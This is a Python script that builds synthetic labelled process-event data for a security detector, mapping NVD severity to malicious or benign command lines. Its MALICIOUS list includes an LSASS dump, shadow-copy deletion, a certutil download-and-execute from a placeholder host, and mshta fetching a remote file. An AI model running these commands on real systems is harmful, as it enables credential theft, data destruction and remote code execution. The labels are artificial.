from __future__ import annotations

import json
from pathlib import Path


MALICIOUS = [
    ("powershell.exe", "powershell -enc SQBFAFgA", "cmd.exe"),
    ("procdump.exe", "procdump.exe -ma lsass.exe dump.dmp", "cmd.exe"),
    ("vssadmin.exe", "vssadmin delete shadows /all /quiet", "cmd.exe"),
    ("certutil.exe", "certutil -urlcache -f http://example.invalid/a.ps1 a.ps1 && powershell iex", "cmd.exe"),
    ("mshta.exe", "mshta http://example.invalid/a.hta", "w3wp.exe"),
    ("python.exe", "nginx worker python -c import os", "nginx.exe"),
    ("cmd.exe", "type C:\\app\\.env", "node.exe"),
]
SAFE = [
    ("python.exe", "python -m unittest discover -s tests", "cmd.exe"),
    ("git.exe", "git status --short", "powershell.exe"),
    ("node.exe", "node server.js", "cmd.exe"),
    ("explorer.exe", "C:\\Windows\\explorer.exe", "wininit.exe"),
]


def convert_nvd_to_events(input_path: str | Path, out_path: str | Path, limit: int = 0) -> dict:
    source = Path(input_path)
    out = Path(out_path)
    out.parent.mkdir(parents=True, exist_ok=True)
    rows = unsafe = safe = 0
    with source.open("r", encoding="utf-8") as handle, out.open("w", encoding="utf-8") as output:
        for line in handle:
            if not line.strip():
                continue
            if limit and rows >= limit:
                break
            record = json.loads(line)
            severity = str(record.get("severity") or record.get("baseSeverity") or "").upper()
            expected = severity in {"CRITICAL", "HIGH"}
            choices = MALICIOUS if expected else SAFE
            proc, cmd, parent = choices[rows % len(choices)]
            event = {
                "label": 1 if expected else 0,
                "expected_unsafe": expected,
                "source": "nvd",
                "cve": record.get("id") or record.get("cve", {}).get("id"),
                "severity": severity or "UNKNOWN",
                "event": {
                    "kind": "process",
                    "process_name": proc,
                    "parent_process": parent,
                    "command_line": cmd,
                    "sensor": "nvd_synthetic_runtime",
                },
            }
            output.write(json.dumps(event, ensure_ascii=False) + "\n")
            rows += 1
            unsafe += 1 if expected else 0
            safe += 0 if expected else 1
    return {"source": str(source.resolve()), "out": str(out.resolve()), "rows": rows, "unsafe": unsafe, "safe": safe}
